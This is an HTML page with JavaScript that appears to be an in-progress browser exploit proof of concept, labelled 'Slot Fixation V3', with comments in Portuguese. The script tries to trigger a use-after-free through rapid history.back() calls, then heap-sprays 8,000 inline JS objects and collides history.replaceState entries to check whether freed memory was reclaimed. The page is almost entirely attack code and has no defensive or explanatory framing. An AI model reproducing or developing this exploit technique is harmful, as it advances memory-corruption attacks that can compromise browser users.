<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Slot Fixation V3 – Plain JSObject Inline</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { font-size:16px; margin:4px; }
pre { white-space:pre-wrap; }
</style>
</head>
<body>

<h2>Slot Fixation V3 — JSObject Inline 9999999</h2>

<button onclick="run()">RUN TEST</button>
<pre id="log"></pre>

<script>
function log(x) {
  document.getElementById("log").textContent += x + "\n";
}

/* ---------------- UAF TRIGGER (mantém seu padrão) ---------------- */

function triggerUAF(cb) {
  log("=== UAF TRIGGER START ===");
  for (let i = 0; i < 48; i += 6) {
    history.back();
    log("[ITER " + i + "] back() async");
  }
  setTimeout(() => {
    log(">>> UAF WINDOW <<<");
    cb();
  }, 40);
}

/* ---------------- SLOT FIXATION V3 ---------------- */

function sprayInlineObjects(count) {
  let arr = [];
  for (let i = 0; i < count; i++) {
    // JSObject pequeno, inline, sem transição de shape
    arr.push({ a: i & 0xff, b: 0x41 });
  }
  return arr;
}

function snapshot(tag) {
  try {
    log("[" + tag + "] history.state = " + JSON.stringify(history.state));
    log("[" + tag + "] keys = " + Object.keys(history.state));
  } catch (e) {
    log("[" + tag + "] state read error");
  }
}

/* ---------------- MAIN TEST ---------------- */

function run() {
  document.getElementById("log").textContent = "";

  log("=== BASELINE ===");
  log("URL.length = " + location.href.length);
  history.replaceState({ i: 1 }, "", location.href);
  snapshot("BASE");

  triggerUAF(() => {

    log("\n=== SLOT FIXATION PHASE (V3) ===");
    let spray = sprayInlineObjects(8000);
    log("Sprayed JSObjects: " + spray.length);

    log("\n=== CONTROL COLLISION ===");
    history.replaceState({ ctrl: "A" }, "", "#A");
    history.replaceState({ ctrl: "B" }, "", "#B");
    history.back();

    log("\n=== POST ===");
    log("URL.length = " + location.href.length);
    log("hash.length = " + location.hash.length);
    snapshot("POST");

    log("\n=== CONSISTENCY CHECK ===");
    try {
      log("Final ctrl = " + history.state.ctrl);
    } catch {
      log("Final ctrl = <exception>");
    }

    log("=== TEST END ===");
  });
}
</script>

</body>
</html>
